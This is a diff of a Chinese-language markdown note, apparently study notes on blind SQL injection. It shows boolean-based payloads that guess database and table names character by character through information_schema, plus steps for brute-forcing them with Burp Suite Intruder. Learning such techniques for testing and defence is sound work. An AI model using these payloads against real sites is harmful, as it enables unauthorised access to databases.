@@ -13,14 +13,14 @@
 
 ![](/assets/BCE183BF80E71F93B891EB4A4CD2AE3E.png)
 
-#### 方法: 配合Burpsuite快速匹配
+#### 方法: 配合Burpsuite快速匹配,[hackbar手注](https://www.jianshu.com/p/127f3bc8df5c)
 
 ![](/assets/C7CBE082C18855C847C61DA54025F7E3.png)
 
 #### 注入流程:
 
 ```sql
-    判断语句末尾加上 %23
+    判断语句末尾加上 %23,参数要设置报错
 查库: and left((select database()),1)='s'
 查表: and left((select table_name from information_schema.tables where table_schema=database() limit 0,1),1)='u'
 利用 burpsute 将拦截的包发送到 intruder 模块，在 position 中选定参数(clear一下)，在payload中选择brute force进行猜解
